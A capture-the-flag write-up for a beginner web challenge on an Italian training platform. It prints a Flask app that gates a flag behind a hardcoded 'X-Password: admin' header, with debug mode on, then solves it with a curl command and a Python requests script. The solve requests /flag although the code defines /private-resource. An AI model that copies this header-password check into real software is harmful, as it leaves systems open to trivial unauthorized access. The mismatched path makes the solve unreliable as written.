# URL
https://training.olicyber.it/challenges#challenge-342
# Concept
* HTTP request headers
* the challenge Python script that deploys the web app are as follows:
```
from os import environ
from http import HTTPStatus
from flask import Flask, request, Response


app = Flask(__name__)


@app.route("/private-resource")
def private_resource():
    if request.headers.get("X-Password") == "admin":
        return Response(environ["FLAG"], mimetype="text/plain", status=HTTPStatus.OK)
    else:
        return Response("Unauthorized", mimetype="text/plain", status=HTTPStatus.UNAUTHORIZED)


if __name__ == "__main__":
    app.run(host="0.0.0.0", debug=True)

```
# Method of solve
* according to the code, if there is a request header: `X-Password` with a value of `admin`, then the flag will be returned by the app
## Curl
* we can use the following curl command to supply the header and get the flag
```
curl -v -H "X-Password: admin" http://web-03.challs.olicyber.it/flag
```
## Python
```
import requests

URL = 'http://web-03.challs.olicyber.it/flag'

custom_headers = {'X-Password': 'admin'}

get_req = requests.get(URL, headers=custom_headers)
req_text = get_req.text
print(req_text)
```
